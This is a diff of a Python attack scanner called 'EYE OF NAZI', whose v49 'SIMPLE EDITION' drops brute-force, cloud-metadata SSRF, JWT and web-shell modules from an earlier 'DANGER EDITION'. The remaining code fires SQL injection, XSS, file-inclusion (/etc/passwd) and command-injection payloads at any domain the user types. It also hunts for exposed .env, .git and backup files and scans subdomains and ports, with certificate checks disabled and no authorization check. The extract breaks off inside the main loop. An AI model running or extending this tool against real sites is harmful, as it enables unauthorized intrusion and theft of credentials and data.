@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# EYE OF NAZI v48.0 - DANGER EDITION
+# EYE OF NAZI v49.0 - SIMPLE EDITION
 # Made by Cyber Kurd Team
 
-import sys, os, re, ssl, time, json, socket, base64
+import sys, os, re, ssl, time, json, socket
 import urllib.parse, urllib.request, urllib.error
-from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 LOGO = r"""
@@ -18,153 +17,55 @@ LOGO = r"""
    ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
 \033[0m\033[93m\033[1m                    EYE OF NAZI
 \033[96m=============================================================\033[0m
-\033[97m\033[1m              DANGER EDITION v48.0\033[0m
+\033[97m\033[1m              SIMPLE EDITION v49.0\033[0m
 \033[2m              Made by Cyber Kurd Team\033[0m
 \033[96m=============================================================\033[0m
 """
 
-PAYLOADS = {
-    'sqli': ["'", "\"", "'--", "1' OR '1'='1", "1' OR 1=1--",
-             "1' AND 1=1--", "1' AND 1=2--", "admin'--",
-             "' UNION SELECT NULL--", "1' ORDER BY 100--",
-             "1' AND SLEEP(3)--"],
-    'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-            "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
-            "'><script>alert(1)</script>"],
-    'lfi': ["../../../../../../etc/passwd", "../../../../../../etc/hosts",
-            "../../../../../../windows/win.ini", "/etc/passwd",
-            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
-    'rce': [";id", "|id", "&&id", "$(id)", ";whoami", "|whoami",
-            ";uname -a", ";ls -la"],
-    'ssrf': ["http://127.0.0.1", "http://localhost",
-             "http://169.254.169.254/latest/meta-data/",
-             "file:///etc/passwd", "http://[::1]"],
-    'redir': ["http://evil.com", "//evil.com", "///evil.com"],
-    'crlf': ["%0d%0aInjected-Header:yes", "%0aInjected-Header:yes"],
-}
+SQ_PAYLOADS = ["'", "\"", "'--", "1' OR '1'='1", "1' OR 1=1--",
+               "1' AND 1=1--", "admin'--", "' UNION SELECT NULL--",
+               "1' ORDER BY 100--", "1' AND SLEEP(3)--"]
 
-SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
-              'blog', 'shop', 'forum', 'cdn', 'static', 'app',
-              'portal', 'vpn', 'git', 'webmail', 'secure', 'login']
+XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>", "\"><script>alert(1)</script>"]
 
-PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
-         1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017, 9200]
+LFI_PAYLOADS = ["../../../../../../etc/passwd",
+                "../../../../../../etc/hosts",
+                "/etc/passwd",
+                "....//....//....//etc/passwd"]
 
-HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'HEAD', 'TRACE']
+RCE_PAYLOADS = [";id", "|id", "&&id", "$(id)", ";whoami", "|whoami"]
 
-SQL_ERR = ["sql syntax", "warning: mysql", "unclosed quotation",
-           "quoted string not properly terminated", "odbc sql server",
-           "sqlite3.operationalerror", "postgresql", "mariadb", "sqlstate"]
+SQL_ERRORS = ["sql syntax", "warning: mysql", "unclosed quotation",
+              "odbc sql server", "postgresql", "mariadb", "sqlstate"]
 
 LFI_IND = ["root:x:0:0", "daemon:x:", "www-data:", "[extensions]"]
 RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]
-SSRF_IND = ["root:x:0:0", "ami-id", "meta-data", "redis_version"]
 
 SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
             'X-Content-Type-Options', 'Content-Security-Policy']
 
-PATHS = [
-    '.env', '.env.local', '.env.production',
-    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
-    'config.php.bak', 'config.json', '.htaccess', '.htpasswd',
-    'web.config', '.git/config', '.git/HEAD',
-    'backup.zip', 'backup.tar.gz', 'backup.sql', 'www.zip',
-    'db.sql', 'database.sql', 'dump.sql',
-    'admin', 'admin/', 'admin.php', 'administrator', 'admin/login',
-    'wp-admin/', 'wp-login.php', 'phpmyadmin', 'pma', 'cpanel', 'webmail',
-    'phpinfo.php', 'info.php', 'test.php', 'server-status',
-    'robots.txt', 'sitemap.xml', 'security.txt',
-    'error.log', 'access.log', 'logs/',
-    'wp-json/', 'wp-json/wp/v2/users', 'xmlrpc.php', 'readme.html',
-    'api/', 'api/v1/', 'api/v2/', 'rest/', 'graphql', 'swagger.json',
-    'uploads/', 'files/', 'downloads/', 'tmp/',
-    'install/', 'setup/', 'db.php', 'database.php',
-    'README.md', 'package.json', 'composer.json', 'Dockerfile',
-]
+PATHS = ['.env', '.env.local', '.env.production', '.git/config',
+         '.git/HEAD', '.htaccess', '.htpasswd', 'web.config',
+         'wp-config.php.bak', 'wp-config.php~', 'config.php.bak',
+         'backup.zip', 'backup.tar.gz', 'backup.sql', 'db.sql',
+         'www.zip', 'site.zip', 'database.sql', 'dump.sql',
+         'admin', 'admin/', 'admin.php', 'wp-admin/', 'wp-login.php',
+         'phpmyadmin', 'pma', 'cpanel', 'webmail', 'phpinfo.php',
+         'info.php', 'test.php', 'server-status', 'robots.txt',
+         'sitemap.xml', 'security.txt', 'error.log', 'access.log',
+         'wp-json/wp/v2/users', 'xmlrpc.php', 'readme.html',
+         'api/', 'api/v1/', 'graphql', 'swagger.json',
+         'uploads/', 'files/', 'tmp/', 'install/', 'setup/',
+         'db.php', 'database.php', 'README.md', 'package.json',
+         'composer.json', 'Dockerfile']
 
-BACKUP_FILES = [
-    'backup.zip', 'backup.tar.gz', 'backup.sql', 'www.zip',
-    'site.zip', 'db.sql', 'database.sql', 'dump.sql',
-    'backup-2024.zip', 'old.zip', 'site_backup.zip',
-]
+PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
+         1433, 3306, 3389, 5432, 6379, 8080, 8443]
 
-ADMIN_PATHS = [
-    'admin', 'admin/', 'admin.php', 'admin/login', 'admin/login.php',
-    'admin/index.php', 'administrator', 'administrator.php',
-    'wp-admin/', 'wp-login.php', 'wp-admin/install.php',
-    'phpmyadmin', 'phpMyAdmin', 'pma', 'mysql', 'adminer.php',
-    'cpanel', 'webmail', 'plesk', 'directadmin',
-    'panel', 'dashboard', 'console', 'backend', 'cms',
-    'login', 'login.php', 'signin', 'auth',
-]
-
-API_ENDPOINTS = [
-    'api', 'api/', 'api/v1', 'api/v1/', 'api/v2', 'api/v2/',
-    'api/v3', 'api/v3/', 'api/v4', 'api/v4/',
-    'api/users', 'api/user', 'api/admin', 'api/login',
-    'api/auth', 'api/config', 'api/status', 'api/health',
-    'api/version', 'api/info', 'api/data', 'api/list',
-    'api/search', 'api/upload', 'api/download', 'api/file',
-    'api/me', 'api/profile', 'api/account', 'api/settings',
-    'rest', 'rest/', 'rest/api', 'rest/v1', 'rest/v1/',
-    'rest/v2', 'rest/users', 'rest/admin',
-    'graphql', 'graphiql', 'graphql.php',
-    'swagger', 'swagger.json', 'swagger.yaml',
-    'openapi.json', 'openapi.yaml', 'api-docs',
-    'docs', 'docs/', 'documentation',
-    'json', 'json/', 'xml', 'xml/', 'rss', 'rss/', 'atom',
-]
-
-SHELL_FILES = [
-    'shell.php', 'cmd.php', 'c99.php', 'r57.php', 'b374k.php',
-    'webshell.php', 'backdoor.php', 'hack.php', 'upload.php',
-    'test.php', 'tmp.php', 'x.php', '1.php', 'a.php',
-    '.shell.php', 'shell.phtml', 'shell.php5', 'shell.php7',
-]
-
-BRUTE_PASSWORDS = [
-    'admin', 'password', '123456', 'admin123', 'root',
-    'password123', 'admin@123', 'admin1', 'administrator',
-    'qwerty', 'letmein', 'welcome', 'changeme', 'test',
-    'test123', 'demo', 'demo123', 'user', 'guest',
-]
-
-JWT_TOKENS = [
-    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
-]
-
-GRAPHQL_QUERIES = [
-    "{__schema{types{name}}}",
-    "{__schema{queryType{name}}}",
-    "query{__typename}",
-    "{__type(name:\"User\"){name,fields{name}}}",
-]
-
-SECRET_PATTERNS = [
-    r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
-    r'secret["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
-    r'AKIA[0-9A-Z]{16}',
-    r'sk_live_[0-9a-zA-Z]{24,}',
-    r'ghp_[0-9a-zA-Z]{36}',
-    r'AIza[0-9A-Za-z\-_]{35}',
-]
-
-CLOUD_METADATA = [
-    'http://169.254.169.254/latest/meta-data/',
-    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-    'http://metadata.google.internal/computeMetadata/v1/',
-    'http://100.100.100.200/latest/meta-data/',
-]
-
-KNOWN_CVES = {
-    'WordPress': {'5.0': ['CVE-2019-8942'], '5.4': ['CVE-2020-4046'],
-                  '5.6': ['CVE-2021-29447'], '6.0': ['CVE-2022-21661']},
-    'Drupal': {'7': ['CVE-2018-7600'], '8': ['CVE-2019-6340']},
-    'Joomla': {'3': ['CVE-2015-8562']},
-    'Magento': {'2': ['CVE-2022-24086']},
-    'Laravel': {'8': ['CVE-2021-3129']},
-}
+SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
+              'blog', 'shop', 'cdn', 'static', 'app', 'portal',
+              'vpn', 'git', 'webmail', 'secure', 'login']
 
 
 class Client:
@@ -174,7 +75,7 @@ class Client:
         self.proxy = proxy
         self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"
 
-    def req(self, url, data=None, method=None, headers=None):
+    def req(self, url, data=None, method=None):
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
@@ -186,24 +87,22 @@ class Client:
         hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
         if self.cookie:
             hdrs['Cookie'] = self.cookie
-        if headers:
-            hdrs.update(headers)
         r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
         t0 = time.time()
         try:
             rp = op.open(r, timeout=self.timeout)
             body = rp.read()
             return {'s': rp.getcode(), 'h': dict(rp.headers),
-                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
-                    'dt': time.time() - t0, 'err': None}
+                    't': body.decode('utf-8', 'ignore'),
+                    'n': len(body), 'dt': time.time() - t0, 'err': None}
         except urllib.error.HTTPError as e:
             try:
                 body = e.read()
             except Exception:
                 body = b''
             return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
-                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
-                    'dt': time.time() - t0, 'err': None}
+                    't': body.decode('utf-8', 'ignore'),
+                    'n': len(body), 'dt': time.time() - t0, 'err': None}
         except Exception as e:
             return {'s': 0, 'h': {}, 't': '', 'n': 0,
                     'dt': time.time() - t0, 'err': str(e)}
@@ -220,12 +119,6 @@ class Scan:
         self.npath = 0
         self.techs = []
         self.waf = []
-        self.crawled = set()
-        self.emails = set()
-        self.secrets = []
-        self.cves = []
-        self.shells = []
-        self.creds = []
 
     def add(self, u, p, t, pl, ev, sev):
         self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
@@ -240,20 +133,7 @@ class Scan:
                  'HEADER': '\033[2m[HDR]\033[0m',
                  'PATH': '\033[92m[PATH]\033[0m',
                  'PORT': '\033[93m[PORT]\033[0m',
-                 'SUB': '\033[94m[SUB]\033[0m',
-                 'SSL': '\033[95m[SSL]\033[0m',
-                 'HTTP': '\033[96m[HTTP]\033[0m',
-                 'CVE': '\033[41m\033[97m[CVE]\033[0m',
-                 'SECRET': '\033[41m\033[97m[SEC]\033[0m',
-                 'EMAIL': '\033[94m[MAIL]\033[0m',
-                 'ADMIN': '\033[92m[ADMIN]\033[0m',
-                 'API': '\033[96m[API]\033[0m',
-                 'SHELL': '\033[41m\033[97m[SHELL]\033[0m',
-                 'JWT': '\033[43m[JWT]\033[0m',
-                 'GRAPHQL': '\033[95m[GQL]\033[0m',
-                 'CORS': '\033[95m[CORS]\033[0m',
-                 'CLOUD': '\033[41m\033[97m[CLOUD]\033[0m',
-                 'BRUTE': '\033[43m[BRUTE]\033[0m'}
+                 'SUB': '\033[94m[SUB]\033[0m'}
         icon = icons.get(t, '[' + t + ']')
         print("\n  " + icon + " \033[1m" + sev + "\033[0m")
         print("    URL    : " + u[:120])
@@ -268,14 +148,15 @@ class Scan:
         pr = urllib.parse.urlparse(url)
         qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
         qs[p] = [pl]
-        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path,
-                                         pr.params,
-                                         urllib.parse.urlencode(qs, doseq=True),
-                                         pr.fragment))
+        new_q = urllib.parse.urlencode(qs, doseq=True)
+        return urllib.parse.urlunparse(
+            (pr.scheme, pr.netloc, pr.path, pr.params, new_q, pr.fragment))
 
     def params(self, url):
         q = urllib.parse.urlparse(url).query
-        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()) if q else []
+        if not q:
+            return []
+        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())
 
     def scan_url(self, url):
         for p in self.params(url):
@@ -283,99 +164,85 @@ class Scan:
             print("  \033[2m->\033[0m \033[93m" + p + "\033[0m @ " + url[:65])
             base = self.cl.req(url)
             b = base['t'] if not base['err'] else ''
-            for pl in PAYLOADS['sqli']:
+            for pl in SQ_PAYLOADS:
                 r = self.cl.req(self.inject(url, p, pl))
                 if r['err']:
                     continue
-                hit = False
-                for err in SQL_ERR:
+                found = False
+                for err in SQL_ERRORS:
                     if err in r['t'].lower():
                         self.add(url, p, 'SQLI', pl, "DB err: " + err, "CRITICAL")
-                        hit = True
+                        found = True
                         break
-                if hit:
+                if found:
                     break
-            for pl in PAYLOADS['xss']:
+            for pl in XSS_PAYLOADS:
                 r = self.cl.req(self.inject(url, p, pl))
                 if r['err']:
                     continue
                 if pl in r['t']:
                     self.add(url, p, 'XSS', pl, "Reflected", "HIGH")
                     break
-            for pl in PAYLOADS['lfi']:
+            for pl in LFI_PAYLOADS:
                 r = self.cl.req(self.inject(url, p, pl))
                 if r['err']:
                     continue
-                hit = False
+                found = False
                 for ind in LFI_IND:
                     if ind in r['t'] and ind not in b:
                         self.add(url, p, 'LFI', pl, "Leak: " + ind, "CRITICAL")
-                        hit = True
+                        found = True
                         break
-                if hit:
+                if found:
                     break
-            for pl in PAYLOADS['rce']:
+            for pl in RCE_PAYLOADS:
                 r = self.cl.req(self.inject(url, p, pl))
                 if r['err']:
                     continue
-                hit = False
+                found = False
                 for ind in RCE_IND:
                     if ind in r['t'] and ind not in b:
                         self.add(url, p, 'RCE', pl, "Output: " + ind, "CRITICAL")
-                        hit = True
+                        found = True
                         break
-                if hit:
-                    break
-            for pl in PAYLOADS['ssrf']:
-                r = self.cl.req(self.inject(url, p, pl))
-                if r['err']:
-                    continue
-                hit = False
-                for ind in SSRF_IND:
-                    if ind in r['t'] and ind not in b:
-                        self.add(url, p, 'SSRF', pl, "Leak: " + ind, "CRITICAL")
-                        hit = True
-                        break
-                if hit:
+                if found:
                     break
 
     def check_headers(self, url):
         r = self.cl.req(url)
         if r['err']:
             return
-        missing = [h for h in SEC_HDRS
-                   if not any(h.lower() == k.lower() for k in r['h'])]
+        missing = []
+        for h in SEC_HDRS:
+            found = False
+            for k in r['h']:
+                if h.lower() == k.lower():
+                    found = True
+                    break
+            if not found:
+                missing.append(h)
         if missing:
-            self.add(url, '', 'HEADER', '', "Missing: " + ", ".join(missing), "LOW")
+            self.add(url, '', 'HEADER', '',
+                     "Missing: " + ", ".join(missing), "LOW")
 
     def fingerprint(self, url):
         r = self.cl.req(url)
         if r['err']:
             return []
-        det = set()
+        det = []
         text_low = r['t'].lower()
         hdr_str = str(r['h']).lower()
-        techs = {
-            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
-            'Drupal': ['drupal'],
-            'Joomla': ['joomla'],
-            'Magento': ['magento'],
-            'Laravel': ['laravel_session'],
-            'Django': ['csrftoken'],
-            'PHP': ['PHPSESSID'],
-            'nginx': ['nginx'],
-            'Apache': ['Apache'],
-            'Cloudflare': ['cloudflare', 'cf-ray'],
-            'React': ['react'],
-            'jQuery': ['jquery'],
-            'LiteSpeed': ['litespeed'],
-        }
-        for tech, signs in techs.items():
-            for s in signs:
-                if s.lower() in text_low or s.lower() in hdr_str:
-                    det.add(tech)
-                    break
-        return sorted(det)
+        techs = [('WordPress', 'wp-content'), ('WordPress', 'wp-includes'),
+                 ('Drupal', 'drupal'), ('Joomla', 'joomla'),
+                 ('PHP', 'phpsessid'), ('nginx', 'nginx'),
+                 ('Apache', 'apache'), ('Cloudflare', 'cloudflare'),
+                 ('Cloudflare', 'cf-ray'), ('React', 'react'),
+                 ('jQuery', 'jquery'), ('LiteSpeed', 'litespeed')]
+        for name, sign in techs:
+            if sign in text_low or sign in hdr_str:
+                if name not in det:
+                    det.append(name)
+        return det
 
     def detect_waf(self, url):
         test_url = url.rstrip('/') + '/?x=' + urllib.parse.quote("' OR 1=1--<script>alert(1)</script>")
@@ -385,19 +252,13 @@ class Scan:
         h_low = str(r['h']).lower()
         b_low = r['t'].lower()
         det = []
-        wafs = {
-            'Cloudflare': ['cf-ray', 'cloudflare'],
-            'AWS WAF': ['x-amzn-requestid'],
-            'Sucuri': ['x-sucuri-id'],
-            'ModSecurity': ['mod_security'],
-            'Wordfence': ['wordfence'],
-            'Akamai': ['akamai'],
-        }
-        for waf, signs in wafs.items():
-            for s in signs:
-                if s in h_low or s in b_low:
-                    det.append(waf)
-                    break
+        wafs = [('Cloudflare', 'cf-ray'), ('Cloudflare', 'cloudflare'),
+                ('AWS WAF', 'x-amzn-requestid'), ('Sucuri', 'x-sucuri-id'),
+                ('ModSecurity', 'mod_security'), ('Wordfence', 'wordfence')]
+        for name, sign in wafs:
+            if sign in h_low or sign in b_low:
+                if name not in det:
+                    det.append(name)
         return det
 
     def check_path(self, base, path):
@@ -412,7 +273,9 @@ class Scan:
     def scan_paths(self, base):
         print("\n\033[96m[*]\033[0m Scanning " + str(len(PATHS)) + " paths...")
         with ThreadPoolExecutor(max_workers=self.threads) as ex:
-            futures = {ex.submit(self.check_path, base, p): p for p in PATHS}
+            futures = []
+            for p in PATHS:
+                futures.append(ex.submit(self.check_path, base, p))
             for fut in as_completed(futures):
                 try:
                     res = fut.result()
@@ -420,177 +283,201 @@ class Scan:
                         self.npath += 1
                         if res['s'] == 200:
                             sev = "MEDIUM"
-                            for x in ['.env', '.git', 'backup', 'wp-config', 'sql']:
+                            high_keys = ['.env', '.git', 'backup', 'wp-config', 'sql']
+                            for x in high_keys:
                                 if x in res['path']:
                                     sev = "HIGH"
                                     break
-                            self.add(res['url'], '', 'PATH', '',
-                                     "Status " + str(res['s']) + " - " + str(res['n']) + "B", sev)
+                            msg = "Status " + str(res['s']) + " - " + str(res['n']) + "B"
+                            self.add(res['url'], '', 'PATH', '', msg, sev)
                         elif res['s'] in (401, 403):
                             self.add(res['url'], '', 'PATH', '',
                                      "Protected (" + str(res['s']) + ")", "INFO")
                 except Exception:
                     pass
 
-    def find_admin(self, base):
-        print("\n\033[96m[*]\033[0m Admin Finder (" + str(len(ADMIN_PATHS)) + ")...")
-        with ThreadPoolExecutor(max_workers=self.threads) as ex:
-            futures = {ex.submit(self.check_path, base, p): p for p in ADMIN_PATHS}
-            for fut in as_completed(futures):
-                try:
-                    res = fut.result()
-                    if res and res['s'] in (200, 401, 403):
-                        sev = "HIGH" if res['s'] == 200 else "MEDIUM"
-                        self.add(res['url'], '', 'ADMIN', '',
-                                 "Admin (" + str(res['s']) + ")", sev)
-                except Exception:
-                    pass
-
-    def fuzz_api(self, base):
-        print("\n\033[96m[*]\033[0m API Fuzzing (" + str(len(API_ENDPOINTS)) + ")...")
-        with ThreadPoolExecutor(max_workers=self.threads) as ex:
-            futures = {ex.submit(self.check_path, base, p): p for p in API_ENDPOINTS}
-            for fut in as_completed(futures):
-                try:
-                    res = fut.result()
-                    if res and res['s'] in (200, 401, 403):
-                        self.add(res['url'], '', 'API', '',
-                                 "API (" + str(res['s']) + ")", "MEDIUM")
-                except Exception:
-                    pass
-
-    def detect_shell(self, base):
-        print("\n\033[96m[*]\033[0m Shell Detector (" + str(len(SHELL_FILES)) + ")...")
-        for sf in SHELL_FILES:
-            url = base.rstrip('/') + '/' + sf
-            r = self.cl.req(url)
-            if not r['err'] and r['s'] == 200:
-                if any(x in r['t'].lower() for x in ['cmd', 'exec', 'system', 'shell_exec', 'passthru']):
-                    self.shells.append(url)
-                    self.add(url, '', 'SHELL', '', "Shell detected!", "CRITICAL")
-
-    def cloud_metadata(self, url):
-        print("\n\033[96m[*]\033[0m Cloud Metadata...")
-        for p in self.params(url):
-            for mu in CLOUD_METADATA:
-                r = self.cl.req(self.inject(url, p, mu))
-                if r['err']:
-                    continue
-                for ind in ['ami-id', 'instance-id', 'access_key', 'secret_key', 'computeMetadata']:
-                    if ind in r['t']:
-                        self.add(url, p, 'CLOUD', mu, "Cloud metadata: " + ind, "CRITICAL")
-                        break
-
-    def check_cors(self, url):
-        print("\n\033[96m[*]\033[0m CORS Misconfiguration...")
-        for origin in ['https://evil.com', 'null']:
-            r = self.cl.req(url, headers={'Origin': origin})
-            if r['err']:
-                continue
-            acao = r['h'].get('Access-Control-Allow-Origin', '') or r['h'].get('access-control-allow-origin', '')
-            acac = r['h'].get('Access-Control-Allow-Credentials', '') or r['h'].get('access-control-allow-credentials', '')
-            if acao == origin or acao == '*':
-                sev = "HIGH" if acac.lower() == 'true' else "MEDIUM"
-                self.add(url, '', 'CORS', origin, "ACAO: " + acao + " ACAC: " + acac, sev)
-                break
-
-    def check_jwt(self, url):
-        print("\n\033[96m[*]\033[0m JWT Analysis...")
-        r = self.cl.req(url)
-        if r['err']:
-            return
-        cookies = r['h'].get('Set-Cookie', '') or r['h'].get('set-cookie', '')
-        tokens = re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', r['t'] + ' ' + cookies)
-        for tok in tokens[:3]:
-            try:
-                header = base64.urlsafe_b64decode(tok.split('.')[0] + '==').decode('utf-8', 'ignore')
-                if '"alg":"none"' in header.replace(' ', ''):
-                    self.add(url, '', 'JWT', tok[:50], "alg:none vulnerability", "CRITICAL")
-                else:
-                    print("  \033[92m[+]\033[0m JWT: " + header[:80])
-            except Exception:
-                pass
-
-    def check_graphql(self, url):
-        print("\n\033[96m[*]\033[0m GraphQL Introspection...")
-        for path in ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']:
-            gql = url.rstrip('/') + path
-            try:
-                data = GRAPHQL_QUERIES[0].encode()
-                r = self.cl.req(gql, data=data, headers={'Content-Type': 'application/json'})
-                if not r['err'] and r['s'] == 200 and '__schema' in r['t']:
-                    self.add(gql, '', 'GRAPHQL', '', "Introspection enabled", "HIGH")
-                    break
-            except Exception:
-                pass
-
-    def brute_login(self, url):
-        print("\n\033[96m[*]\033[0m Login Brute Force...")
-        base = url.rstrip('/')
-        for lp in ['wp-login.php', 'admin/login.php', 'admin/login', 'login.php']:
-            login_url = base + '/' + lp
-            r = self.cl.req(login_url)
-            if r['err'] or r['s'] not in (200, 401, 403):
-                continue
-            print("  \033[92m[+]\033[0m Login page: " + login_url)
-            for pwd in BRUTE_PASSWORDS[:5]:
-                for usr in ['admin', 'administrator', 'root']:
-                    try:
-                        data = urllib.parse.urlencode({'log': usr, 'pwd': pwd, 'wp-submit': 'Log In'}).encode()
-                        r2 = self.cl.req(login_url, data=data, method='POST')
-                        if not r2['err'] and (r2['s'] == 302 or 'wordpress_logged_in' in str(r2['h']).lower()):
-                            cred = usr + ":" + pwd
-                            self.creds.append(cred)
-                            self.add(login_url, '', 'BRUTE', cred, "Login successful!", "CRITICAL")
-                            break
-                    except Exception:
-                        pass
-
-    def crawl(self, url, depth=1):
-        print("\n\033[96m[*]\033[0m Crawling (depth=" + str(depth) + ")...")
-        to_visit = [(url, 0)]
-        while to_visit:
-            cur, d = to_visit.pop(0)
-            if cur in self.crawled or d > depth:
-                continue
-            self.crawled.add(cur)
-            r = self.cl.req(cur)
-            if r['err'] or not r['t']:
-                continue
-            if '?' in cur:
-                self.scan_url(cur)
-            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r['t'])
-            for email in emails:
-                email = email.lower()
-                if email not in self.emails and 'example' not in email:
-                    self.emails.add(email)
-                    self.add(cur, '', 'EMAIL', '', "Email: " + email, "INFO")
-            for pat in SECRET_PATTERNS:
-                for m in re.finditer(pat, r['t'], re.IGNORECASE):
-                    found = m.group(0)[:80]
-                    if found not in self.secrets:
-                        self.secrets.append(found)
-                        self.add(cur, '', 'SECRET', '', "Secret: " + found, "HIGH")
-            if d < depth:
-                links = re.findall(r'href=["\']([^"\']+)["\']', r['t'], re.IGNORECASE)
-                for lk in links:
-                    if lk.startswith(('javascript:', '#', 'mailto:')):
-                        continue
-                    full = urllib.parse.urljoin(cur, lk)
-                    try:
-                        host = urllib.parse.urlparse(self.url).netloc
-                        if host in full and full not in self.crawled:
-                            to_visit.append((full, d + 1))
-                    except Exception:
-                        pass
-        print("  \033[92m[+]\033[0m Crawled " + str(len(self.crawled)) + " URLs")
-
     def enum_subdomains(self, domain):
         print("\n\033[96m[*]\033[0m Subdomain Enumeration...")
         found = []
+        with ThreadPoolExecutor(max_workers=20) as ex:
+            futures = []
+            for s in SUBDOMAINS:
+                futures.append((s, ex.submit(self.cl.req, "http://" + s + "." + domain)))
+            for s, fut in futures:
+                try:
+                    res = fut.result()
+                    if not res['err'] and res['s'] in (200, 301, 302, 401, 403):
+                        url = "http://" + s + "." + domain
+                        found.append(url)
+                        self.add(url, '', 'SUB', '',
+                                 "Subdomain (" + str(res['s']) + ")", "MEDIUM")
+                except Exception:
+                    pass
+        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " subdomain(s)")
 
-        def check(sub):
-            url = "http://" + sub + "." + domain
-            r = self.cl.req(url)
-            if not r['err'] and r['s'] in (200, 301, 302, 401, 403):
-                return {'url': url, 's': r['s']
+    def scan_ports(self, host):
+        print("\n\033[96m[*]\033[0m Port Scanning " + host + "...")
+        found = []
+        for p in PORTS:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                result = s.connect_ex((host, p))
+                s.close()
+                if result == 0:
+                    found.append(p)
+                    self.add(host + ":" + str(p), '', 'PORT', '',
+                             "Port " + str(p) + " open", "MEDIUM")
+            except Exception:
+                pass
+        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " open port(s)")
+
+    def run_all(self):
+        print("\n\033[96m" + "=" * 60 + "\033[0m")
+        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
+        print("\033[96m" + "=" * 60 + "\033[0m")
+
+        print("\n\033[96m[1/7]\033[0m Security Headers...")
+        self.check_headers(self.url)
+
+        print("\n\033[96m[2/7]\033[0m Fingerprinting...")
+        techs = self.fingerprint(self.url)
+        if techs:
+            print("  \033[92m[+]\033[0m " + ", ".join(techs))
+            self.techs = techs
+
+        print("\n\033[96m[3/7]\033[0m WAF Detection...")
+        waf = self.detect_waf(self.url)
+        if waf:
+            print("  \033[93m[!]\033[0m WAF: " + ", ".join(waf))
+            self.waf = waf
+
+        print("\n\033[96m[4/7]\033[0m URL Parameters...")
+        self.nt += 1
+        self.scan_url(self.url)
+
+        print("\n\033[96m[5/7]\033[0m Sensitive Paths...")
+        self.scan_paths(self.url)
+
+        host = urllib.parse.urlparse(self.url).hostname
+        if host:
+            print("\n\033[96m[6/7]\033[0m Subdomains...")
+            try:
+                self.enum_subdomains(host)
+            except Exception:
+                pass
+
+            print("\n\033[96m[7/7]\033[0m Ports...")
+            try:
+                self.scan_ports(host)
+            except Exception:
+                pass
+
+        print("\n\033[96m" + "=" * 60 + "\033[0m")
+        crit = 0
+        high = 0
+        med = 0
+        for f in self.f:
+            if f['severity'] == 'CRITICAL':
+                crit += 1
+            elif f['severity'] == 'HIGH':
+                high += 1
+            elif f['severity'] == 'MEDIUM':
+                med += 1
+        print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
+        print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
+        print("    \033[43m HIGH     \033[0m " + str(high))
+        print("    \033[93m MEDIUM   \033[0m " + str(med))
+        print("\033[96m" + "=" * 60 + "\033[0m\n")
+
+    def save_json(self, filename):
+        with open(filename, 'w', encoding='utf-8') as fp:
+            json.dump({'target': self.url, 'findings': self.f},
+                      fp, indent=2, ensure_ascii=False)
+        print("\033[92m[+]\033[0m JSON saved: " + filename)
+
+
+def is_url(text):
+    if text.startswith(('http://', 'https://')):
+        return True
+    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
+        return True
+    return False
+
+
+def main():
+    print(LOGO)
+    print("\n\033[96m" + "=" * 60 + "\033[0m")
+    print("\033[92m  Ready. Type a domain (e.g. kurd4u.com).\033[0m")
+    print("\033[96m" + "=" * 60 + "\033[0m\n")
+
+    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}
+
+    while True:
+        try:
+            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
+                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
